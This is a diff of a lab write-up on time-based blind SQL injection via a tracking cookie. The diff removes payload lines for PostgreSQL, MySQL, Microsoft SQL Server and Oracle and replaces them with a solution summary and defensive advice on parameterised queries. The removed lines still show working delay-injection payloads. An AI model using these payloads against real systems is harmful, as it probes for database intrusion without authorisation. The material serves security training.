@@ -6,36 +6,10 @@
 
 **Goal:** Cause a time delay to prove the injection works (usually 10 seconds).
 
-## Technique
+## Official solution summary
 
-Time-based blind SQLi using `SLEEP()`, `pg_sleep()`, or `WAITFOR DELAY` depending on the database.
+The official solution uses the tracking cookie to make query processing take measurably longer. The lab is solved when the response exhibits the specified ten-second delay.
 
-## Common Payloads
+## Defensive takeaways
 
-**PostgreSQL (most common in this lab):**
-
-```
-'; SELECT pg_sleep(10)--
-```
-
-**MySQL:**
-
-```
-'; SELECT SLEEP(10)--
-```
-
-**Microsoft:**
-
-```
-'; WAITFOR DELAY '0:0:10'--
-```
-
-**Oracle:**
-
-```
-' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',10)--
-```
-
-## Solution
-
-Inject the appropriate time-delay payload into the TrackingId cookie. If the response takes ~10 seconds, the lab is solved.
+Treat tracking identifiers as untrusted input and pass them to the database only as bound parameters. Apply request timeouts and monitor unusual latency, but do not rely on timing controls as a substitute for safe query construction.
